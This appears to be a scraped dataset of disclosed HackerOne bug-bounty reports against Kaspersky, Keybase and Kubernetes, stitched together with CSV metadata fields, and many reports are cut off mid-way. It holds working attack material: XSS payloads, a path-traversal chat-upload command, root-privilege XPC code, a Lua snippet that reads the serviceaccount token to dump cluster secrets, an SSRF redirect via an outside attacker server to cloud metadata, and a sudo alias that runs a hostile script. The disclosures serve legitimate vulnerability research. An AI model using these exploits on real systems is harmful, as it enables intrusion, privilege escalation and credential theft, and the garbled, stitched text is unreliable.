Now download the attached rebinding_server.py and phishing_override.html to some directory on your computer and run rebinding_server.py (Python 3 required). This will run an HTTPS server on https://localhost:5000/, with an additional server on http://localhost:5001/ that will make the primary server alternate between the first (supposedly valid) and second (invalid) SSL certificate.
Open https://localhost:5000/phishing_override.html in your browser (override the certificate warning, real attackers would use a website with a valid certificate).
Note how you are being redirected to https://www.amtso.org/check-desktop-phishing-page/ without any further confirmation, anti-phishing functionality will no longer warn stop you from going there until Kaspersky is restarted. There is a message being displayed saying ""Threat of data loss"" in the title and ""Allowed link"" in the message body, this is confusing and unlikely to make the user suspect anything.

Recommendations
Warning pages should not be first-party to the pages affected by them. Instead of directly serving HTML content within a 499 response, Kaspersky could produce a redirect to kis.v2.scr.kaspersky-labs.com here and produce the content under that location. This would prevent websites from accessing contents of such warning pages.
Even then, links triggering such important actions shouldn't be predictable. This is most easily achieved by using a real cryptographic signature such as HMAC-SHA256. A link like http://touch.kaspersky.com/?id=<link_id>&host=<host>&signature=<HMAC-SHA256(secret, link_id || host)> cannot be manipulated without knowing the user-specific secret which will hopefully never be exposed to the web.
Impact
Attackers able to MiTM user's internet connection (e.g. on a public WiFi) will be able to trick the user into unwittingly confirming a certificate override for high profile websites such as Google, thus essentially disabling MiTM protection offered by SSL.
Also, arbitrary websites will be able to disable Safe Money or anti-phishing protection for any website without any user interaction. Other Kaspersky Internet Security functionality might be similarly affected.",https://hackerone.com/reports/469372,Moscow,Russia,Moscow,2018,12,18,11,43
Kaspersky,1001-5000,0.0,200m-1b,"$2,500.00",High,7.95,Cross-site Scripting (XSS) - Generic,URL Advisor component in KIS products family is vulnerable to Universal XSS,"palant  submitted a report to Kaspersky.Dec 17th (4 years ago)Summary
In Microsoft Edge, URL Advisor UI is served as first-party content on every domain. So the XSS vulnerability I found in this UI automatically applies to all websites, it allows running code in the context of any domain.
Description
URL Advisor frame is located under https://www.google.com/<INJECT_ID>/ua/url_advisor_balloon.html and https://www.yahoocom/<INJECT_ID>/ua/url_advisor_balloon.html in Microsoft Edge (always the same INJECT_ID value). It gets its content from a message sent via window.postMessage() without validating message origin. Under some circumstances it will assign that data as link target, so a malicious website can make that link point to a javascript: URL. Clickjacking then allows making the user click that link - while sites like google.com use X-Frame-Options header to disallow framing, no such restrictions are in place for the url_advisor_balloon.html frame.
Environment

Scope: Application
Product name: Kaspersky Internet Security
Product version: 19.0.0.1088
OS name and version (incl SP): Windows 10.0.17134
Attack type: Universal XSS
Maximum user privileges needed to reproduce your issue: no privileges

Steps to reproduce

Download attached server.py and universal_xss.html to some directory on your computer and run server.py (Python 3 required). This is a very rudimentary HTTP server running on http://localhost:5000/, you could use some other web server as well.
Edit the file %WINDIR%\sysnative\drivers\etc\hosts as administrator and add the following line: 127.0.0.1 www.google.example.com. Normally, you would just use a subdomain of a domain you own - the host name has to start with ""www.google."" for URL Advisor to apply to it.
Open Microsoft Edge and go to http://www.google.example.com:5000/universal_xss.html
As advised by the page, move your mouse and click somewhere on the page.

You will see an alert message saying: ""Hi, this is JavaScript code running on www.google.com."" That's the result of the code alert('Hi, this JavaScript code is running on ' + document.domain) executing in the context of the Google website. Injecting code into any other domain would have been easily possible as well.
Recommendation
This user interface should never be served as first-party, even once the vulnerability here is fixed. Any XSS vulnerability in Kaspersky code automatically elevates to Universal XSS otherwise, this is too dangerous. Frankly, I don't see why it is done in this way with Microsoft Edge - in Firefox and Internet Explorer the same UI is always served via kis.v2.scr.kaspersky-labs.com, so vulnerabilities here don't affect other websites.
Impact
A malicious website can easily make users click by pretending to be a game. And while the user clicks, they will be allowing the attackers to inject code into various internet domains and exfiltrating data in the background.",https://hackerone.com/reports/463915,Moscow,Russia,Moscow,2018,12,17,14,0

An attacker can claim ownership of a GitHub user's handle if the user forks the attacker's gist with a verification snippet generated by the attacker pointing towards the user's handle.
PoC
With my colleague's permission (@jackds) I claimed their GitHub handle with this gist: https://gist.github.com/EdOverflow/ae2b07342dfd0c2793dcb763bca51770. They simply forked the gist, as seen here: https://gist.github.com/jackds1986/c722170d819e67b4fedb7447b84cd2b2. Keybase then imports the profile picture from @jackds' GitHub account and sets it as my Keybase profile picture.

To make matters worse, anybody that now browses to @jackds' GitHub profile using the Keybase browser extension believe they are messaging @jackds' when in fact all the messages land in my inbox. The UI makes it look like I am @jackds and therefore completely breaks the confidentiality of the Keybase service.

Mitigation
When verifying ownership of GitHub handles, ensure that the gist is not a fork. I believe it is possible to do this with the GitHub gist API.
Impact
Users can no longer trust GitHub handles on Keybase.2 attachments:F256102: Screenshot_from_2018-01-21_17-40-30.pngF256105: keybase_issue.pngmaxtaco Keybase staff  changed the status to Triaged. Jan 23rd (5 years ago)Repro'ed, thanks for the report.maxtaco Keybase staff  posted a comment. Jan 23rd (5 years ago)Ok, we've rolled out a fix, can you help us verify the fix?

In report https://hackerone.com/reports/307670 the reported identified a flow which abuses parsing differences between Keybase and Hackernews. Also the original reports is resolved there appears to be a bypass having the same impact by abusing upper-case letters.
Steps to reproduce

Browse to: https://news.ycombinator.com/user?iD=rbanffy&id=blaa
Click on the Keybase Extension icon.
Notice that the pop-up shows the username blaa while thehackernews page shows the username: rbanffy (See attached image).

Root cause
Keybase only searches for lower-case letters, however thehackernews allows upper-case ones to.
Impact

Keybase,11-50,0.0,1m-10m,"$5,000.00",High,7.6,Remote File Inclusion,"Keybase client (Windows 10): Write files anywhere in userland using relative path in ""download attachement"" feature","op1um  submitted a report to Keybase.Oct 13th (3 years ago)Summary
I've tested this vulnerability on Windows 10, with last keybase client.
If a user click on ""Download file"" during a chat, an attacker can write files anywhere in userland. When downloading a file from a chat, the file should always be written in ""Downloads"" folder.
Proof of concept
You need to use a linux operating system to send the files to the Windows 10 client, because you will need to create files with ""\"" characters in them.
Create a file and name it with a relative path, for example to write in C:\Users\USER\Desktop you can name the file: ""........\Desktop\proof.txt""
Then send it with a title to make the weird name of the file less noticeable by the victim.
You can do this with the commands:
Code 197 BytesWrap lines Copy Download1echo ""PoC Keybase"" > proof.txt
2cp proof.txt ..\\..\\..\\..\\Desktop\\proof.txt
3keybase chat upload testaccount2 ~/Desktop/keybase_bughunting/..\\..\\..\\..\\Desktop\\proof.txt --title ""Download me""
Then on the Windows client, click on the file to download it, a file called ""proof.txt"" is written in the folder ""C:\Users\USER\Desktop\""
Impact
An attacker could use this vulnerability to write files anywhere in userland.
Example of attack scenario
An attacker could use this vulnerability to perform dll hijacking attacks, by writing a dll in userland. This could lead to code execution.2 attachments:F606261: Screenshot_20191013_040910.pngF606262: result_bug_bounty.png",https://hackerone.com/reports/713006,New York,United States,New York,2019,10,13,2,28

Keybase,11-50,0.0,1m-10m,"$5,000.00",High,7.95,Privilege Escalation,Privilege Escalation via Keybase Helper,"xpn  submitted a report to Keybase.Aug 20th (4 years ago)A privilege escalation vulnerability exists within the KeybaseHelper application available when installing the Keybase Desktop Application on MacOS.
The issue is exposed via a LaunchDaemon plist which is installed within /Library/LaunchDaemons/keybase.Helper.plist. This file is responsible for launching /Library/PrivilegedHelperTools/keybase.Helper for the registered mach port keybase.Helper.
If we take the source code located at https://github.com/keybase/client/blob/master/osx/Helper/KBHelper.m, we can see a number of exposed ""methods"" via an XPC connection, including:

remove - Ability to remove any file on the filesystem as the root user
move - Ability to move any file on the filesystem as the root user
createDirectory - Ability to create a directory as the root user, and provide attributes such as the owner UID/GID and permissions
addToPath - Add applications to the /usr/local/bin directory
kextInstall - Add and start kext 

Interacting with the helper via XPC takes place via the MPMessagePack framework, which is available from https://github.com/gabriel/MPMessagePack/blob/master/XPC/MPXPCClient.m.
If we craft a very simple POC, we can see that it is trivial to place files within dangerous locations:
Code 400 BytesWrap lines Copy Download1    NSError *error;
2    MPXPCClient *client = [[MPXPCClient alloc] initWithServiceName:@""keybase.Helper"" privileged:true];
3    [client connect:&error];
4    
5    // Moves any file from ""source"" to ""destination"" as the root user
6    [client sendRequest:@""move"" params:@[@{@""source"":@""/tmp/src"", @""destination"":@""/Library/dst""}] completion: ^(NSError *error, id value) {
7        NSLog(@""WORKS"");
8    }];
It does appear than an effort has been made to avoid executing arbitrary applications by the helper, for example, we can see the following comments within the """" method:
Code 168 BytesWrap lines Copy Download1    // Make sure the passed-in redirector binary points to a proper binary
2    // signed by Keybase, we don't want this to be able to run arbitrary code
3    // as root.
This doesn't stop us from elevating privileges however, for example, we can simply use the 'move' method to copy any file (or overwrite any file). As a simple example, below we can see a simple operation moving a plist file into /Library/LaunchDaemons/com.xpnsec.test.plist:
Code 215 BytesWrap lines Copy Download1    [client sendRequest:@""move"" params:@[@{@""source"":@""/tmp/elevate.plist"", @""destination"":@""/Library/LaunchDaemons/com.xpnsec.test.plist""}] completion: ^(NSError *error, id value) {
2        NSLog(@""WORKS"");
3    }];
On reboot, we see that our service is installed and executed as the root user.
Alternatively, we can simply copy our malicious payload using the above method to /Library/PrivilegedHelperTools/keybase.Helper and spawn via our XPC call.
Impact
The impact would be elevation of privileges from any user with permission to access the keybase.Helper XPC service (which is currently all users) to the root user on macOS.",https://hackerone.com/reports/397478,New York,United States,New York,2018,8,20,23,4

When using the Keybase Chrome extension and viewing a Hacker News profile page with an additional id parameter in the query string, Hacker News uses the username from the first id parameter, whereas the Keybase extension uses the username from the second id parameter.

Note that this is the profile page for the Hacker News user TomNomNom, whereas the Keybase Chat modal is for the (in this case non-existent) Keybase user TornNomNom (i.e. with the first m replaced with an r and an n).

Using a bug any user can change the keybase and git-remote-keybase symlinks in the /usr/locale/bin folder. We can exploit this to run arbitrary code as the user.
Steps to reproduce

In the example I will use the low privileged nobody account (could be any other account) and I will target the u3mur4 admin user.

Notice that the u3mur4 account executed our binary because we could change the symlinks in the /usr/local/bin directory. From now on we can access any file and run arbitrary command as the targeted account. Also we can access the private keybase folder of the user and other sensitive data.


How to become root?

Because we can run arbitrary code as the targeted user we have multiple ways to achieve root privileges. By using misconfigurations with a little bit of social engineering you can get your victim to escalate you to root without realizing it.


By adding this line to the users .bash_profile: alias sudo='sudo sh -c '\''evil.sh & exec ""$@""'\'' sh'. We can change the behavior of what happens when the user runs “sudo”.


AppleScript is fairly simple, and can be used to phish for passwords for nearly anything.  If you can acquire the password of an administrator user, you can escalate to root. So when the user runs the keybase binary we can create a popup that the 'keybase helper need to update...' and the user have to enter the password.


This will work up until El Capitan: The sudoers policy caches credentials for 5 minutes, unless overridden in sudoers(5). What this means is that once a user runs sudo, they can run a command with sudo again for up to 5 minutes without having to enter their password again.


Short version (see source 2): Homebrew changes the permissions on /usr/local/bin to the user (or any process running as the user) is able to write files to it and give those files executable permissions. Now if you (or someone else, or some other program) were to place a program called sudo in /usr/local/bin, then every time you typed sudo it would be that program that would be executed, not the real one.

Why can we change the symlinks?

the 3th item is the most important


In the client/osx/Installer/Options.m:125 file

Code 100 BytesWrap lines Copy Download1NSString *servicePath = [self.appPath stringByAppendingPathComponent:@""Contents/SharedSupport/bin""];
the code appends the Contents/SharedSupport/bin path to the specified appPath. We specified appPath in step 2 as /Applications/Keybase.app/../../var/tmp/poc. After appending the path, the servicePath becomes /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin which resolves to /var/tmp/poc/Contents/SharedSupport/bin. That is why we created the directory structure specified in step 2.

the code checks that the servicePath start with /Application. That is why we specify the /Application... appPath with the ../.. components in step 3.

In the client/osx/Helper/KBHelper.m:371 file the install function will call the checkAbsolutePath function with path=/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase and prefix=/Applications/Keybase.app arguments.

21        }
22    }
23    return YES;
24}
The a (path) array becomes ["""", Application, ""Keybase.app"", Contents, SharedSupport, bin, keybase]. So the stringByStandardizingPath function will resolves the /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase link that is why it will start as the b ["""", Application, ""Keybase.app""] array. The function will return YES and the add addToPath function will create the link.

the code checks that /usr/local/bin + serviceBinName link resolves to the same place as our specified servicePath (appPath + Contents/SharedSupport/bin) + serviceBinName. That is why we created two symlink to the original binaries in step 2.

Notice that we have permission to remove, modify later this link, (in step 4 and 5).

Missing quarantine attribute for downloaded files allows remote attacker to send executable file that won't be checked by Gatekeeper (codesign bypass). 


Since sent executable files lack com.apple.quarantine meta-attribute, no alert about launching executable file from the web will be shown to user.


That means, dblclick on file in Finder.app (or any similar gesture to launch the file) immediately launches the attacker's file.


PoC

Attacker sends exploit.terminal to the victim (file is unsigned)
Victim opens exploit.terminal
No alert from Gatekeeper about unsigned executable

Keybase allows you to see other users' sigchains by navigating to https://keybase.io/<username\/sigchain>. The ""Payload"" field containing JSON related to the chainlink on the right side of the page is not correctly escaped during templating, leading to a persistent XSS as users have a high degree of control over the contents of that field.
Specifically, the /user/sigchain_signature.toffee template's compiled code contains:

Proof-of-Concept

Create a new account on https://keybase.io or remove all keys / associations from an existing account
Generate a GPG keypair locally and upload the public half via https://keybase.io. Make sure you import these into your GPG keychain.
When the site asks you to upload the private half, select ""maybe another time"", then select the option to sign the pubkey with ""command line with [bash + GPG + cURL]""
keybase.io will spit out a few lines of bash to paste into your terminal, copy this to a text editor.
Replace ""tag"":""signature"" section of the JSON payload in the cURL command with ""tag"":""</textarea><script>alert(1)</script>"". There's no particular reason we have to inject into the tag field, it was just the first field I saw that wasn't validated and was reflected in the ""payload"" field on the sigchain page.

Run the command, then go to https://keybase.io/<YOUR_USERNAME\/sigchain>. You should see an alert() box pop.

I can also make a profile that repros this issue if you like, I've cleared my profile since verifying this was an issue.
Impact
It seems like most sensitive functionality on keybase.io is behind a password re-entry wall, so if the victim didn't have a password manager that would autopopulate password fields on https://keybase.io the attacker would have to dump a fake login prompt into the DOM to be able to do anything ""interesting"". I suppose an attacker would at least be able to pull down the user's TripleSec-encrypted privkey bundles to perform an offline attack without any special user interaction.
However, the frontend JS references some admin-only API endpoints (viewing crashlogs, billing stuff, etc) that don't seem to require password re-auth. An XSS in the context of an admin user's session would probably allow an attacker to abuse those endpoints.
Remediation
The ""payload"" JSON should be escaped in the template like anything else in a text node. More generally, more of web frontend code should be switched to modern HTML templating techniques. There's a number of suspect instances of semi-user-controlled data being passed into HTML sinks like $.html(), $.append(), $.prepend(), etc.
The web frontend would also be a good candidate for CSP with nonces, since it doesn't seem to pull in third-party resources other than statics from S3, and that would have mitigated this XSS in most modern browsers.

Kubernetes,251-500,0.0,200m-1b,"$2,500.00",High,7.6,Privilege Escalation,Authenticated kubernetes principal with restricted permissions can retrieve ingress-nginx serviceaccount token and secrets across all namespaces,"libio  submitted a report to Kubernetes.Jul 1st (about 1 year ago)Summary:
Retrieving ingress-nginx serviceaccount token
ingress-nginx allows adding custom snippets of nginx configuration to Kubernetes ingress objects. These snippets can be applied to either the relevant location {} or server {} blocks with the following annotations, respectively.

https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#configuration-snippet
https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#server-snippet

Inside the server {} block we can add a custom snippet of lua-code that reads the serviceaccount token that is mounted inside the ingress-nginx pod. We then set it as an nginx variable and return it to the client at a configured location. This might look like this:
Code 396 BytesWrap lines Copy Download1    nginx.ingress.kubernetes.io/server-snippet: |
2      set_by_lua $token '
3        local file = io.open(""/run/secrets/kubernetes.io/serviceaccount/token"")
4        if not file then return nil end
5        local content = file:read ""*a""
6        file:close()
7        return content
8      ';

10      location = /token {
11        content_by_lua_block {
12          ngx.say(ngx.var.token)
13        }
14      }
Impact
The ingress-nginx serviceaccount has the permissions to list secrets across all namespaces. With the ingress-nginx serviceaccount's token a user, with otherwise restricted privileges, can at least:

exfiltrate all kubernetes secrets
get tokens of all kubernetes serviceaccounts; allowing an attacker to elevate his privileges to potentially cluster-admin

Vendors such as rancher-labs bundle ingress-nginx, or a forked version of ingress-nginx, with their software. Solutions provided by these vendors might also be vulnerable.
kube-apiserver proxy
ingress-nginx can be configured to expose the Kubernetes kube-apiserver by creating a Kubernetes Service of type ExternalName and pointing it to kubernetes.default; the hostname at which the kubernetes api is available inside the cluster. This can expose an otherwise private and protected kube-apiserver to untrusted networks like the internet.
Requirements to exploit
To successfully exploit this vulnerability an attacker would need access to an already authenticated user or serviceaccount that has the permissions to create the following resources inside kubernetes:

ingress
service

Additionally the attacker needs network access to the ingress-nginx-controller loadbalancer or in-cluster service to retrieve the ingress-nginx serviceaccount token. The hostname configured in the ingress object does not necessarily have to resolve to the ingress-nginx-controller's loadbalancer; ingress-nginx will also serve us the token if we manually add the Host-header.
Kubernetes Version:
Any, as far as I am aware. This was tested with AWS EKS 1.20.
Component Version:
Any, as far as I am aware. This was tested with the following release of ingress-nginx:

chart: ingress-nginx-3.33.0
application: 0.47.0

Steps To Reproduce:
I created a proof-of-concept (poc.sh) that requires the following:

A kubernetes cluster with ingress-nginx installed; ingress-nginx should not be restricted to a single namespace
A local kubeconfig file configured to communicate with the kubernetes cluster
A user configured in the kubeconfig file with the permissions to create ingress and service objects in the namespace configured in the kubeconfig context

The proof-of-concept requires setting the INGRESS_HOST environment variable. This variable should contain a hostname that resolves to the ingress-nginx-controller's loadbalancer. This is made easy on clusters where a wildcard DNS-record is pointing to the loadbalancer.
When invoked, the script will:

Apply the required ingress and service;

exposing the ingress-nginx serviceaccount token at https://$INGRESS_HOST/token
proxying all requests to the kubernetes apiserver at https://$INGRESS_HOST


Retrieve the ingress-nginx serviceaccount token
Write a local kubeconfig;

Using the kube-apiserver proxy
Using the ingress-nginx serviceaccount token


Write secrets from all namespaces to a local file called secrets.json
For each serviceaccount token found in secrets.json check if the serviceaccount has cluster-admin privileges. If so, create a new user and context in the local kubeconfig file with the serviceaccount's token

Summary:
Use of nginx.ingress.kubernetes.io/auth* annotations results in a file named {namespace}-{ingress}.passwd. If user knows the namespace and ingress of an ingress they want to compromise they need to be able to create a namespace that is some subset of {namespace}-{ingress}. Then they create an ingress with the remainder of the name and a passwd file of their choosing, this overwrites the other namespace's passwd file and effectively removes the auth layer provided by nginx ingress.

Steps To Reproduce:

Install nginx ingress
Create namespace a and ingress b-c within a with an auth annotation.
Create namespace a-b and ingress c within a-b with an auth annotation that overrides the passwd file from #2.
Auth to ingress on a/b-c is now governed by the htpasswd file generated for a-b/c.

Suggested Resolution:

Change line 141 of internal/ingress/annotations/auth/main.go to %v/%v/%v.
Create folder to go along with.
Check that the folder and file will actually be in the right location (.. is allowed as a namespace).

Impact

Summary:
If an attacker manages to escape a (eg. privileged) container and gains access to the underlying node it can replace the Kubelet process listening on port 10250/10255 on the node. A fake Kubelet server issueing 301 redirects can trick 'kubectl' (or other clients) into issueing commands against a other pods in the cluster.  This attack bypasses firewalling configurations where nodes cannot talk directly to eachother on port 10250/10255 and also works when port 10250 requires authentication since kubectl is happy to resend the Authorization header / bearer token when a 301redirect is received. 
Kubernetes Version:
1.14.10
Component Version:
kubelet/kubectl
Steps To Reproduce:

Attacker escapes container 
Attacker issues a 'kill -9 pidof kubelet; python fakekubet.py  (see attachment)
Attacker waits for a /exec request coming in to the fakekubelet.py server, and redirects it (with an arbitrary command) to another node.  

Example exec request for 'hello-app'  by kubectl:
10.138.0.10 - - [01/May/2020 11:28:55] ""POST /exec/default/hello-server-7f8fd4d44b-j5rsc/hello-app?command=%2Fbin%2Fs&input=1&output=1&tty=1 HTTP/1.1"" 307 - 
Example response by the fakekubelet:

Location: https://10.138.0.8/exec/default/victim-67c59cd9f4-vm5dl/nginx?command=/bin/arbitrary_command_here&error=1&input=1&output=1&tty=0

kubectl follows the redirect and contacts the victim node, requesting /exec as specified by fakekubelet.py (can also redirect to 'master')

Who we are :
We’re two French security researchers and our respective names are Brice Augras and
Christophe Hauquiert, we worked and found the vulnerability together.
Brice Augras from https://www.groupe-asten.fr/ company - https://hackerone.com/reeverzax
Christophe Hauquiert - https://hackerone.com/hach
Summary
We recently led some security investigations about Kubernetes product hosted in a managed
service.
By abusing product vulnerability due to implementation context, we would like to bring to your
attention technical details about what we found.
We started an investigation process on multiple managed k8s offers and found quite each time a Critical
Impact vulnerability as this can vary from half-blind SSRF and allow an attacker to perform internal services enumeration inside the distributor perimeter to full SSRF vulnerability .
We're getting in touch with you about the vulnerability you just got aware of two weeks ago from security team we were in touch with.  
Technical specification :

Fake vendor name : example.com
Kubernetes release for half-blind SSRF scenario: 1.14
Kubernetes release for complete SSRF vulnerability :  up to v1.15.3, v1.14.6 and v1.13.10

We don't know if the previous information regarding k8s release can be useful for you as each distributor seems to manage its own k8s custom cluster release. 

Attacker server: https://bzh.ovh (51.38.238.22)
Provided file with proof of concept scripts: PoC.zip

PoC.zip (F685902)
Compromission Scenario
Here is the main workflow we followed in order to escape from our customer environment on multiple distributors
providing k8s managed offer.
Firstly, we created a k8s cluster on distributors managed k8s service.
Mainly, these vendors use the following infrastructure : 
Image F685875: screen2.png 36.20 KiBZoom in Zoom out Copy Download
After configuring kubectl binary, we were able to manage our customer cluster provided by example.com
When creating a persistent volume claim associated with a custom StorageClass on our
cluster, the provisioning step is handled by the kube/cloud controller manager (depending of the release),
we noticed that the process was handled  inside vendor internal perimeter.
We discovered the existence of a half-blind SSRF vulnerability inside multiple
StorageClasses (glusterfs, scaleio, storageos) due to k8s managed context.
This half-blind SSRF can be used us to scan master VPC network and request the different listening services
(Metadata instance, Kubelet, ETCD, etc..) based on the kube-controller responses.
Initially, we were only limited to HTTP POST requests as we were unable to retrieve content of
body page if the response code was equal to 200 and not in JSON Content-Type.
But we improved our first payload by combining the previous step with a 302 redirect from an
external server in order to convert POST request to GET request.
In addition to this, if the managed k8s offer service provider was using an old k8s cluster release AND allowed customer kube-controller-manager logs access, an attacker could interact in a more convenient way by crafting full user-controllable HTTP requests and get full HTTP response.
This was the attack scenario with the most impact.
Indeed, while we were working on our research project, we managed to perform some of the following actions among different managed k8s providers: Priv esc with credential retrieving via metadata instances, DoS the master instance with HTTP request (unencrypted) on ETCD master instances, etc...
PoC
PoC n°1 - Half Blind SSRF
While doing some analysis on glusterFS storage Class Golang source, we noticed that
the first HTTP request issued during a Volume creation
(https://github.com/heketi/heketi/blob/master/client/api/go-client/volume.go#L34), /volumes
was appended at the end of the user provided URL in resturl parameter.
In order to remove the end of this unwanted path, we used the # trick in the resturl
parameter.
Here is the first YAML payload we used as evidence for the half-blind SSRF vulnerability:

PoC n°2 : Redirecting POST to GET HTTP request trick
The first request issued by Glusterfs client was a POST type, by doing the following steps,
we were able to convert POST request to GET:
• Storage class uses http://bzh.ovh/redirect.php# as resturl parameter
• https://bzh.ovh/redirect.php endpoint responds with 302 HTTP return code with the
following Location Header http://169.254.169.254 (could be any other internal
resource, this redirected url is used for example purposes)
• As by default Golang net/http library follows redirection and convert POST to GET
with 302 return code, the targeted resource is then requested with a HTTP GET request.
We were able to read HTTP response body on some requests by describing persistent
volume claim object:
Code 24 BytesWrap lines Copy Download1kubectl describe pvc xxx
Or, getting events from Kubernetes cluster with command below:
Code 17 BytesWrap lines Copy Download1kubectl get event
Here is an example of JSON response we were able to retrieve : 
Image F685919: json_response.png 36.91 KiBZoom in Zoom out Copy Download
The exploitation process of our vulnerability at this moment was limited due to the
following elements:

We were not able to inject HTTP headers in the emitted request
We were not able to perform POST HTTP Request with body parameters (useful to
request key value on ETCD instance running on 2379 PORT if HTTP unencrypted is used)
We were not able to retrieve response body content when HTTP return code was
200 and not a JSON Content-Type response.

PoC n°3 : Managed cluster Lan scanning and sensitive data exposure
At least, as we had the possibility to scan LAN resources, the next step was automation.
Indeed, in order to scan one IP address and one port we had to realize the following tasks:

Delete previous tested Storage Class
Delete previous tested Persistent Volume Claim
Change IP and PORT in sc.yaml
Create Storage Class with new IP and port
Create new Persistent Volume Claim
Since the way to scan for one resource was very specific and incompatible with traditional
SSRF exploitation tools or scanners, we decided to create some kind of custom workers in
bash script.
In order to be able to scan 172.16.0.0/12 range faster, we launched 15 simultaneously workers.
The above IP range was chosen just for demonstration purposes and can be adapted to each provider internal IP range.


Each worker was launched the following command:

PoC n°4  : CRLF + smuggling HTTP injection in old Kubernetes cluster releases
In addition to all the previous steps, we found a more efficient way to retrieve full HTTP
response body content in addition to craft complete HTTP requests that were user controlled.
Unfortunately, the vulnerability requires the following prerequisites:

Kube Controller Manager logs reachable by the customer
Kubernetes Cluster version using Golang version <1.12 (See technical requirements chapter for additional information about specific k8s releases concerned)

We still wan't to bring this attack scenario with a PoC as some providers still have some
customers using one of these “deprecated” k8s release.
We realized a first PoC in a local environment to demonstrate the vulnerability.
Here are some technical details about them:
We discovered a vulnerability was existing for the following Golang releases <1.12
(https://github.com/golang/go/issues/30794) that allowed to produce HTTP smuggling/CRLF
attacks.
By combining the Half-Blind SSRF described above and the vulnerability, we were able to send complete
crafted requests, including custom headers, HTTP method, parameters and data that were
going to be executed by the kube-controller-manager.
In addition to previous steps, we were able to retrieve full HTTP responses from interal requested resource. 
We deployed a local environment simulating Kubernetes exchanges between the GlusterFS
Go client and a fake targeted server. (PoC is http-smuggling-poc in the zip file).
Here is an example of a working StorageClass resturl parameter payload performing an HTTP
smuggling attack + CRLF during provisioning step in order to leak response content in kube-
controller logs:
Here is an example of a working StorageClass resturl parameter payload allowing to perform this kind of attack scenario :

Here is the complete HTTP response that was leaking inside the lube-controller-manage logs :

Impact
Impact Analysis
This was quite hard for us to evaluate how hard the impact was for these two attack vectors.
Indeed, as they are vendor dependent, we preferred to take the lowest score we found about impact analysis regarding to whom we reported the security problematic.
Feel free to exchange with us about the CVSS score about you consider for this vulnerability as this seems to be related to managed context k8s environment.
From the various distributors we led research on, we noticed that this could lead to  the following impact analysis : 
Integrity

Lateral movement with cloud steal credentials (from metadata API)
Remote command execution by using these credentials
Reproducing above scenario in an IDOR way with other resources discovered in LAN area.

Confidentiality

Information gathering by LAN scannin (ssh version, http server versions, ...)
Instances and infrastructure information by requesting internal API like metadata APIs (http://169.254.169.254, ...)
Customers data leak, by using cloud credentials

Availability
All the post-exploitation scenarios about integrity attack vectors could be used to perform disruptive scenarios and make master instance from our customer perimeter or other customer unavailable. 
Indeed, as we are in managed k8senvironment and considering the integrity impact, we can imagine lots of scenarios that can impact availability. An additional example could be to corrupt ETCD database or perform critical call to kubernetes API.

This is quite a complicated case for us as there are multiple companies involved in it. That's the reason why we would like to ask you the following question : 
Are we allowed, without giving details, to answer to the companies we were initially in relation with that there is no ""updates on resolution or disclosure timelines yet""  and that they should try to get in touch with Kubernetes Product Security Committee if they wan't to have more specific details ? 
Obviously, since you triaged the vulnerability, we stopped our investigations on the other hosting providers that might be concerned about the root vulnerability.

Brice Augras from Groupe-Asten, Christophe Hauquierttallclair Kubernetes staff  posted a comment. May 28th (2 years ago)FYI, we've decided to drop the integrity impact to none, which downgrades this to a medium (https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N).
Here is a pre-release draft of our planned announcement issue:

TITLE: CVE-2020-8555: Half-Blind SSRF in kube/cloud-controller-manager
CVSS Rating: CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N
There exists a Server Side Request Forgery (SSRF) vulnerability in kube-controller-manager that allows certain authorized users to leak up to 500 bytes of arbitrary information from unprotected endpoints within the master's host network (such as link-local or loopback services).
An attacker with permissions to create a pod with certain built-in Volume types (GlusterFS, Quobyte, StorageFS, ScaleIO) or permissions to create a StorageClass can cause kube-controller-manager to make GET requests or POST requests without an attacker controlled request body from the master's host network.
Am I vulnerable?
You may be vulnerable if:

You are running a vulnerable version (see below)
There are unprotected endpoints normally only visible from the Kubernetes master (including link-local metadata endpoints, unauthenticated services listening on localhost, or other services in the master's private network)
Untrusted users can create pods with an affected volume type or modify storage classes.

Affected Versions

kube-controller-manager v1.18.0
kube-controller-manager v1.17.0 - v1.17.4
kube-controller-manager v1.16.0 - v1.16.8
kube-controller-manager < v1.15.11

The affected volume types are: GlusterFS, Quobyte, StorageFS, ScaleIO
How do I mitigate this vulnerability?
Prior to upgrading, this vulnerability can be mitigated by adding endpoint protections on the master or restricting usage of the vulnerable volume types (for example by constraining usage with a PodSecurityPolicy or third-party admission controller such as Gatekeeper) and restricting StorageClass write permissions through RBAC.
Fixed Versions
The information leak was patched in the following versions:

kube-controller-manager master - fixed by https://github.com/kubernetes/kubernetes/pull/89794
kube-controller-manager v1.18.1+ - fixed by https://github.com/kubernetes/kubernetes/pull/89796
kube-controller-manager v1.17.5+ - fixed by https://github.com/kubernetes/kubernetes/pull/89837
kube-controller-manager v1.16.9+ - fixed by https://github.com/kubernetes/kubernetes/pull/89838
kube-controller-manager v1.15.12+ - fixed by https://github.com/kubernetes/kubernetes/pull/89839

So we don't understand why the CVE is talking about pods, do you have additional information regarding this step ?

Creating a StorageClass is generally considered higher privilege than creating a pod. Our team was able to identify a path to exploit from a pod, but we're not sharing the details right now.

Our understanding of PodSecurityPolicy is that it only restricts pod creation/edition process and not PersistentVolumeClaim resource. We also read in the documentation ""Warning: PodSecurityPolicy does not limit the types of PersistentVolume objects that may be referenced by a PersistentVolumeClaim"". Regarding that we don't understand how PSP could mitigate this vulnerability as dynamic volume provisioning is triggered as soon as PVC object is created.

Similarly, creating PVs is typically designated to an admin, so a PSP is a way of preventing less privileged users from exploiting this.reeverzax   posted a comment. Jun 1st (2 years ago)Hello Tim,

Summary:
""CVE-2019-11250: TOB-K8S-001: Bearer tokens are revealed in logs"" remains in effect.  
Kubernetes Version:
Effects at least all versions since 1.4.

This was determined with some git archaeology.  This was determined by following the code snippet from it's current location in kubernetes/staging/src/k8s.io/client-go/transport/round_trippers.go
The snippet was last meaningfully modified 
It's current location in The snippet remains relatively unchanged since 

Component Version:
I'm not sure.
Steps To Reproduce:

Spin up a cluster with high verbosity: klog.V(9).Enabled()
Watch logs  round_trippers.go curl -k -v -X<> -H ""Authorization: <token>"" <...>

